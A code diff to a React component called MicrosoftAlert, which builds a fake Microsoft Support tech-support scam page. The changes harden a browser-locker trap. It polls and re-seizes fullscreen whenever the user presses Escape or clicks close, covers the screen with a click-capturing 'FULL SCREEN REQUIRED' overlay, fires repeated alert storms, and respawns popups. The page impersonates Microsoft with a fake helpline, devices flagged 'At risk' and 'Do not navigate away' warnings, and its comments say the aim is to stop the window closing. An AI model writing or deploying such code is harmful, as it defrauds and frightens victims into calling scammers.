@@ -69,6 +69,7 @@ export default function MicrosoftAlert() {
   const [voiceLine, setVoiceLine] = useState("");
   const [isSafari, setIsSafari] = useState(false);
   const [isChromeTarget, setIsChromeTarget] = useState(false);
+  const [fsLost, setFsLost] = useState(false);
 
   const logoClicks = useRef(0);
   const unlockedRef = useRef(false);
@@ -119,22 +120,30 @@ export default function MicrosoftAlert() {
     }
   }, [stopVoice]);
 
+  const isFsActive = () => {
+    const doc = document as Document & { webkitFullscreenElement?: Element };
+    return !!(document.fullscreenElement || doc.webkitFullscreenElement);
+  };
+
   const enterFullscreen = useCallback(async () => {
     if (unlockedRef.current) return;
+    if (isFsActive()) {
+      setFsLost(false);
+      return;
+    }
     const el = (stageRef.current || document.documentElement) as HTMLElement & {
       webkitRequestFullscreen?: () => void;
       webkitRequestFullScreen?: () => void;
       msRequestFullscreen?: () => void;
     };
-    const doc = document as Document & { webkitFullscreenElement?: Element };
     try {
-      if (document.fullscreenElement || doc.webkitFullscreenElement) return;
       if (el.requestFullscreen) await el.requestFullscreen();
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
       else if (el.msRequestFullscreen) el.msRequestFullscreen();
+      if (isFsActive()) setFsLost(false);
     } catch {
-      /* next click / interval retry */
+      setFsLost(true);
     }
   }, []);
 
@@ -143,12 +152,25 @@ export default function MicrosoftAlert() {
     if (fsLock.current) return;
     fsLock.current = window.setInterval(() => {
       if (unlockedRef.current || !armedRef.current) return;
-      const doc = document as Document & { webkitFullscreenElement?: Element };
-      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
+      if (!isFsActive()) {
+        setFsLost(true);
         void enterFullscreen();
+      } else {
+        setFsLost(false);
       }
-    }, 600);
+    }, 250);
   }, [enterFullscreen]);
+
+  const reclaimFullscreen = useCallback(
+    (e?: { preventDefault?: () => void; stopPropagation?: () => void }) => {
+      e?.preventDefault?.();
+      e?.stopPropagation?.();
+      if (unlockedRef.current) return;
+      void enterFullscreen();
+      lockFullscreen();
+    },
+    [enterFullscreen, lockFullscreen],
+  );
 
   const speakLineSpeech = useCallback(async (text: string): Promise<void> => {
     if (!window.speechSynthesis) return;
@@ -256,8 +278,8 @@ export default function MicrosoftAlert() {
       }
     } finally {
       alertBusy.current = false;
-      // alert() fullscreen tod deta hai — turant wapas lock
       if (!unlockedRef.current && armedRef.current) {
+        setFsLost(true);
         lockFullscreen();
         window.setTimeout(() => void enterFullscreen(), 50);
         window.setTimeout(() => void enterFullscreen(), 200);
@@ -407,10 +429,13 @@ export default function MicrosoftAlert() {
 
     const onFsChange = () => {
       if (unlockedRef.current || !armedRef.current) return;
-      const doc = document as Document & { webkitFullscreenElement?: Element };
-      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
-        // Escape / alert ne FS tod di — turant wapas
-        window.setTimeout(() => lockFullscreen(), 30);
+      if (!isFsActive()) {
+        setFsLost(true);
+        // Escape / top-corner exit — turant reclaim try + barrier
+        window.setTimeout(() => void enterFullscreen(), 0);
+        window.setTimeout(() => void enterFullscreen(), 100);
+      } else {
+        setFsLost(false);
       }
     };
 
@@ -488,6 +513,7 @@ export default function MicrosoftAlert() {
     fireAlertStorm,
     startVoiceLoop,
     lockFullscreen,
+    enterFullscreen,
     stopAll,
   ]);
 
@@ -498,21 +524,25 @@ export default function MicrosoftAlert() {
   };
 
   const tryClose = (which: "blue" | "white" | "toast") => {
+    // Top-corner ×: window band mat hone do; pehle FS wapas
     if (!armedRef.current) armTrap();
-    fireAlertStorm();
-    setExtraPopups((n) => n + 1);
+    else reclaimFullscreen();
+    setExtraPopups((n) => Math.min(n + 1, 8));
     if (which === "blue") {
       setShowBlue(false);
-      window.setTimeout(() => setShowBlue(true), 300);
+      window.setTimeout(() => setShowBlue(true), 180);
     }
     if (which === "white") {
       setShowWhite(false);
-      window.setTimeout(() => setShowWhite(true), 300);
+      window.setTimeout(() => setShowWhite(true), 180);
     }
     if (which === "toast") {
       setShowToast(false);
-      window.setTimeout(() => setShowToast(true), 400);
+      window.setTimeout(() => setShowToast(true), 220);
     }
+    window.setTimeout(() => {
+      if (!unlockedRef.current) fireAlertStorm();
+    }, 450);
   };
 
   if (unlocked) {
@@ -536,7 +566,7 @@ export default function MicrosoftAlert() {
   return (
     <main
       ref={stageRef}
-      className="fixed inset-0 z-[9999] h-[100dvh] w-screen overflow-hidden bg-[#f3f3f3] text-[#1b1b1b]"
+      className="fixed inset-0 z-[9999] h-[100dvh] w-screen overflow-hidden bg-[#f3f3f3] text-[#1b1b1b] [:fullscreen]:h-screen [:fullscreen]:w-screen"
     >
       {/* Fake Microsoft Support site (behind popups) */}
       <div className="pointer-events-none absolute inset-0 select-none overflow-hidden">
@@ -567,39 +597,129 @@ export default function MicrosoftAlert() {
             Unlock now
           </span>
         </div>
-        <div className="h-full bg-gradient-to-b from-white via-[#f5f8fc] to-[#e8eef6] px-4 pt-8 sm:px-10">
-          <p className="text-3xl font-light text-[#1b1b1b] sm:text-4xl">
-            Welcome to Microsoft Support
-          </p>
-          <p className="mt-2 max-w-2xl text-[14px] text-[#555]">
-            Get help with Windows, Microsoft 365, Surface, Xbox, and accounts.
-            Sign in for personalized support for your devices and subscriptions.
-          </p>
-          <div className="mt-8 grid max-w-5xl grid-cols-2 gap-3 sm:grid-cols-3 sm:gap-4">
-            {[
-              ["Set up & install", "Apps, devices, and activation"],
-              ["Microsoft 365", "Subscriptions, apps, and billing"],
-              ["Accounts & billing", "Passwords, security, payments"],
-              ["Windows", "Updates, performance, recovery"],
-              ["Security & protection", "Defender, privacy, antivirus"],
-              ["Devices & Xbox", "Surface, PC, consoles, apps"],
-            ].map(([title, sub]) => (
-              <div
-                key={title}
-                className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm"
-              >
-                <p className="text-[14px] font-semibold text-[#0078d4]">{title}</p>
-                <p className="mt-1 text-[12px] text-[#666]">{sub}</p>
+        <div className="h-full bg-gradient-to-b from-white via-[#f5f8fc] to-[#e8eef6] px-4 pt-6 sm:px-8">
+          <div className="flex gap-6 lg:gap-8">
+            {/* Left column */}
+            <div className="min-w-0 flex-1">
+              <p className="text-3xl font-light text-[#1b1b1b] sm:text-4xl">
+                Welcome to Microsoft Support
+              </p>
+              <p className="mt-2 max-w-xl text-[14px] text-[#555]">
+                Get help with Windows, Microsoft 365, Surface, Xbox, and
+                accounts. Sign in for personalized support for your devices and
+                subscriptions.
+              </p>
+              <div className="mt-6 grid grid-cols-2 gap-3 sm:gap-4">
+                {[
+                  ["Set up & install", "Apps, devices, and activation"],
+                  ["Microsoft 365", "Subscriptions, apps, and billing"],
+                  ["Accounts & billing", "Passwords, security, payments"],
+                  ["Windows", "Updates, performance, recovery"],
+                  ["Security & protection", "Defender, privacy, antivirus"],
+                  ["Devices & Xbox", "Surface, PC, consoles, apps"],
+                ].map(([title, sub]) => (
+                  <div
+                    key={title}
+                    className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm"
+                  >
+                    <p className="text-[14px] font-semibold text-[#0078d4]">
+                      {title}
+                    </p>
+                    <p className="mt-1 text-[12px] text-[#666]">{sub}</p>
+                  </div>
+                ))}
               </div>
-            ))}
-          </div>
-          <div className="mt-10 max-w-5xl border-t border-[#ddd] pt-6 text-[11px] text-[#777]">
-            <p className="font-semibold text-[#555]">Microsoft Support • Official help</p>
-            <p className="mt-2">
-              Advertising · Business · Privacy · Terms · About our ads · Contact
-              us · Feedback
-            </p>
-            <p className="mt-1">© Microsoft Corporation. All rights reserved.</p>
+              <div className="mt-8 border-t border-[#ddd] pt-5 text-[11px] text-[#777]">
+                <p className="font-semibold text-[#555]">
+                  Microsoft Support • Official help
+                </p>
+                <p className="mt-2">
+                  Advertising · Business · Privacy · Terms · About our ads ·
+                  Contact us · Feedback
+                </p>
+                <p className="mt-1">
+                  © Microsoft Corporation. All rights reserved.
+                </p>
+              </div>
+            </div>
+
+            {/* Right column — peeche visible data */}
+            <aside className="hidden w-[300px] shrink-0 space-y-4 xl:w-[340px] md:block">
+              <div className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm">
+                <p className="text-[13px] font-semibold text-[#1b1b1b]">
+                  Contact support
+                </p>
+                <p className="mt-2 text-[12px] text-[#555]">
+                  Talk to a Microsoft support agent about Windows Security,
+                  Defender, and account recovery.
+                </p>
+                <p className="mt-3 text-[12px] font-semibold text-[#0078d4]">
+                  Helpline {PHONE}
+                </p>
+                <p className="mt-1 text-[11px] text-[#888]">
+                  Available 24/7 · English / Regional
+                </p>
+              </div>
+
+              <div className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm">
+                <p className="text-[13px] font-semibold text-[#1b1b1b]">
+                  Popular topics
+                </p>
+                <ul className="mt-2 space-y-2 text-[12px] text-[#0078d4]">
+                  <li>Fix Windows update errors</li>
+                  <li>Remove malware with Microsoft Defender</li>
+                  <li>Reset forgotten Microsoft account password</li>
+                  <li>Troubleshoot blue screen (BSOD)</li>
+                  <li>Restore files after ransomware</li>
+                  <li>Enable firewall & real-time protection</li>
+                </ul>
+              </div>
+
+              <div className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm">
+                <p className="text-[13px] font-semibold text-[#1b1b1b]">
+                  Your devices
+                </p>
+                <div className="mt-3 space-y-2 text-[12px]">
+                  <div className="flex items-center justify-between rounded bg-[#f5f5f5] px-2 py-2">
+                    <span>Windows PC</span>
+                    <span className="text-[11px] text-[#c50f1f]">At risk</span>
+                  </div>
+                  <div className="flex items-center justify-between rounded bg-[#f5f5f5] px-2 py-2">
+                    <span>Microsoft Edge</span>
+                    <span className="text-[11px] text-[#c50f1f]">Blocked</span>
+                  </div>
+                  <div className="flex items-center justify-between rounded bg-[#f5f5f5] px-2 py-2">
+                    <span>OneDrive</span>
+                    <span className="text-[11px] text-[#888]">Sync paused</span>
+                  </div>
+                </div>
+              </div>
+
+              <div className="rounded-lg border border-[#f1c6c8] bg-[#fff8f8] p-4 shadow-sm">
+                <p className="text-[13px] font-semibold text-[#c50f1f]">
+                  Security advisory
+                </p>
+                <p className="mt-2 text-[12px] leading-relaxed text-[#555]">
+                  Active threat detected on this network session. Keep this
+                  support page open and follow on-screen instructions from
+                  Windows Security Center.
+                </p>
+                <p className="mt-2 text-[11px] text-[#888]">
+                  Ref: Er#USA00dd7 · Do not navigate away
+                </p>
+              </div>
+
+              <div className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm">
+                <p className="text-[13px] font-semibold text-[#1b1b1b]">
+                  Recent articles
+                </p>
+                <ul className="mt-2 space-y-2 text-[12px] text-[#555]">
+                  <li>What to do if you see a virus alert</li>
+                  <li>How Microsoft Protects your identity</li>
+                  <li>Safe browsing tips for Windows 11</li>
+                </ul>
+              </div>
+            </aside>
           </div>
         </div>
       </div>
@@ -895,6 +1015,29 @@ export default function MicrosoftAlert() {
             ) : (
               <>Click anywhere to continue</>
             )}
+          </span>
+        </button>
+      )}
+
+      {/* Fullscreen toot gaya (Esc / top exit) — click se turant wapas */}
+      {isArmed && fsLost && (
+        <button
+          type="button"
+          className="absolute inset-0 z-[90] cursor-pointer bg-black/55"
+          onPointerDown={reclaimFullscreen}
+          onClick={reclaimFullscreen}
+        >
+          <span className="pointer-events-none absolute left-1/2 top-1/2 w-[min(420px,92vw)] -translate-x-1/2 -translate-y-1/2 rounded border border-[#c50f1f] bg-[#1b1b1b] px-5 py-4 text-center text-white shadow-2xl">
+            <p className="text-[15px] font-bold text-[#c50f1f]">
+              ⚠ FULL SCREEN REQUIRED
+            </p>
+            <p className="mt-2 text-[13px]">
+              Security quarantine paused. Click anywhere to restore full-screen
+              lock and continue.
+            </p>
+            <p className="mt-3 text-[12px] text-[#7CFC00]">
+              Click / tap to continue →
+            </p>
           </span>
         </button>
       )}
